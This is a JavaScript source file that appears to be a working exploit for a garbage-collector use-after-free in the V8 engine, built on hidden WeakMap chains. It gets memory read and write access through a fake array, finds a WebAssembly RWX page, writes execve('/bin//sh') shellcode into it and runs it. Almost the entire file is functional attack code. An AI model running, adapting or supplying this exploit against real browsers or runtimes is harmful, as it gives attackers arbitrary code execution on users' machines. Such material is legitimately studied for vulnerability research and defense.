function sleep(miliseconds) {
   var currentTime = new Date().getTime();
   while (currentTime + miliseconds >= new Date().getTime()) {
   }
}

var initKey = {init : 1};
var level = 4;
var map1 = new WeakMap();
var gcSize = 0x4fe00000;

//Get mapAddr using DebugPrint for double array (the compressed address of the map)
var mapAddr = 0x8203ae1;

var rwxOffset = 0x60;

var code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
var module = new WebAssembly.Module(code);
var instance = new WebAssembly.Instance(module);
var wasmMain = instance.exports.main;

//Return values should be deleted/out of scope when gc happen, so they are not directly reachable in gc
function hideWeakMap(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = new WeakMap();
    prevMap.set(prevKey, thisMap);
    let thisKey = {'h' : i};
    //make thisKey reachable via prevKey
    thisMap.set(prevKey, thisKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      let retMap = new WeakMap();
      map.set(thisKey, retMap);
      return thisKey;
    }
  }
}
//Get the key for the hidden map, the return key is reachable as strong ref via weak maps, but should not be directly reachable when gc happens
function getHiddenKey(map, level, initKey) {
  let prevMap = map;
  let prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = prevMap.get(prevKey);
    let thisKey = thisMap.get(prevKey);
    prevMap = thisMap;
    prevKey = thisKey;
    if (i == level - 1) {
      return thisKey;
    }
  }
}

function setUpWeakMap(map) {
//  for (let i = 0; i < 1000; i++) new Array(300);
  //Create deep enough weak ref trees to hiddenMap so it doesn't get discovered by concurrent marking
  let hk = hideWeakMap(map, level, initKey);
//Round 1 maps
  let hiddenMap = map.get(hk);
  let map7 = new WeakMap();
  let map8 = new WeakMap();

//hk->k5, k5: discover->wl
  let k5 = {k5 : 1};
  let map5 = new WeakMap();
  let k7 = {k7 : 1};
  let k9 = {k9 : 1};
  let k8 = {k8 : 1};
  let ta = new Uint8Array(1024);
  ta.fill(0xfe);
  let larr = new Array(1 << 15);
  larr.fill(1.1);
  let v9 = {ta : ta, larr : larr};
  map.set(k7, map7);
  map.set(k9, v9);

//map3 : kb|vb: initial discovery ->wl
  hiddenMap.set(k5, map5);
  hiddenMap.set(hk, k5);

//iter2: wl: discover map5, mark v6 (->k5) black, discovery: k5 black -> wl
//iter3: wl: map5 : mark map7, k7, no discovery, iter end
  map5.set(hk, k7);
  
//Round 2: map5 becomes kb in current, initial state: k7, map7 (black), goes into wl
//iter1

//wl discovers map8, and mark k8 black
  map7.set(k8, map8);
  map7.set(k7, k8);

//discovery moves k8, map8 into wl
//iter2 marks k9 black, iter finished
  map8.set(k8,k9);
  
}
var view = new ArrayBuffer(24);
var dblArr = new Float64Array(view);
var intView = new Int32Array(view);
var bigIntView = new BigInt64Array(view);

function ftoi32(f) {
  dblArr[0] = f;
  return [intView[0], intView[1]];
}

function i32tof(i1, i2) {
  intView[0] = i1;
  intView[1] = i2;
  return dblArr[0];
}

function itof(i) {
  bigIntView = BigInt(i);
  return dblArr[0];
}

function ftoi(f) {
  dblArr[0] = f;
  return bigIntView[0];
}

function gc() {
  //trigger major GC: See https://tiszka.com/blog/CVE_2021_21225_exploit.html (Trick #2: Triggering Major GC without spraying the heap)
  new ArrayBuffer(gcSize);
}

function restart() {
  //Should deopt main if it gets optimized
  global.__proto__ = {};
  gc();
  sleep(2000);
  main();
}

function main() {
	setUpWeakMap(map1);
	gc();

	let objArr = [];

	for (let i = 0; i < 200; i++) {
	  let thisArr = new Array(1 << 15);
	  objArr.push(thisArr);
	}
	//These are there to stop main being optimized by JIT
    globalIdx['a' + globalIdx] = 1;
    let obj = [1.1,1.1,1.1];
    //Can't refactor this, looks like it cause some double rounding problem (got optimized?)
	for (let i = 0; i < objArr.length; i++) {
	  let thisArr = objArr[i];
	  thisArr.fill(instance);
	}
    globalIdx['a' + globalIdx + 1000] = 1;
    let result = null;
	try {
      result = fetch();
    } catch (e) {
      console.log("fetch failed");
      restart();
      return;
    }
    if (!result) {
	  console.log("fail to find object address.");
      restart();
      return;
    }

    let larr = result.larr;
    let index = result.idx;

    let instanceAddr = ftoi32(larr[index])[0];
    console.log("found instance address: 0x" + instanceAddr.toString(16) + " at index: " + index);
	for (let i = 0; i < objArr.length; i++) {
	  let thisArr = objArr[i];
	  thisArr.fill(obj);
	}
    globalIdx['a' + globalIdx + 2000] = 1;

    let addr = ftoi32(larr[index])[0];
    let objEleAddr = addr - 0x20 + 0x8;
    let floatAddr = i32tof(objEleAddr, objEleAddr);
    let floatMapAddr = i32tof(mapAddr, mapAddr);
    //Faking an array at using obj[0] and obj[1]
    obj[0]  = floatMapAddr;
    let eleLength = i32tof(instanceAddr + rwxOffset, 10);

    obj[1] = eleLength;

    larr[index] = floatAddr;

    console.log("array address: 0x" + addr.toString(16));
    console.log("array element address: 0x" + objEleAddr.toString(16));

    let rwxAddr = 0;
    let objArrIdx = -1;
    let thisArrIdx = -1;
    for (let i = 0; i < objArr.length; i++) {
      globalIdx['a' + globalIdx + 3000] = 1;
	  global.__proto__ = {};
      let thisArr = objArr[i];
      for (let j = 0; j < thisArr.length; j++) {
        let thisObj = thisArr[j];
        if (thisObj != obj) {
          console.log("fake array at: " + i + " index: " + j);
          objArrIdx = i;
          thisArrIdx = j;
          if (!(thisObj instanceof Array)) {
            console.log("failed getting fake array.");
            restart();
            return;
          }
          rwxAddr = thisObj[0];
          console.log("rwx address at: 0x" + ftoi(rwxAddr).toString(16));
        }
      }
    }
    globalIdx['a' + globalIdx + 4000] = 1;

    if (rwxAddr == 0) {
      console.log("failed getting rwx address.");
      restart();
      return;
    }

    //Read shellArray address
    let shellArray = new Uint8Array(100);
    let thisArr = objArr[objArrIdx];
    thisArr.fill(shellArray);

    let shellAddr = ftoi32(larr[index])[0];
    console.log("shellArray addr: 0x" + shellAddr.toString(16));
    obj[1] = i32tof(shellAddr + 0x20, 10);
    //Place fake array back into objArr[objArrIdx][thisArrIdx]
    larr[index] = floatAddr;
    let fakeArray = objArr[objArrIdx][thisArrIdx];
    fakeArray[0] = rwxAddr;
    var shellCode = [0x31, 0xf6, 0x31, 0xd2, 0x31, 0xc0, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x56, 0x53, 0x54, 0x5f, 0xb8, 0x3b, 0, 0, 0, 0xf, 0x5];
    for (let i = 0; i < shellCode.length; i++) {
      shellArray[i] = shellCode[i];
    }
    wasmMain();
}

function findTA(ta) {
    let found = false;
    for (let i = 0; i < 16; i++) {
      if (ta[i] != 0xfe) {
          console.log(ta[i]);
          return true;
      }
    }
    console.log(ta[0]);
    return found;
}

function findLArr(larr) {
    for (let i = 0; i < (1 << 15); i++) {
        if (larr[i] != 1.1) {
          let addr = ftoi32(larr[i]);
          return i;
        }
	}
	return -1;
}

function fetch() {
	let hiddenKey = getHiddenKey(map1, level, initKey);
	let hiddenMap = map1.get(hiddenKey);
	let k7 = hiddenMap.get(hiddenMap.get(hiddenKey)).get(hiddenKey);
	let k8 = map1.get(k7).get(k7);
	let map8 = map1.get(k7).get(k8);

	let larr = map1.get(map8.get(k8)).larr;
    let index = findLArr(larr);
	if (index == -1) {
	  return;
	}
    return {larr : larr, idx : index};
}
global = {};
globalIdx = 0;
main();
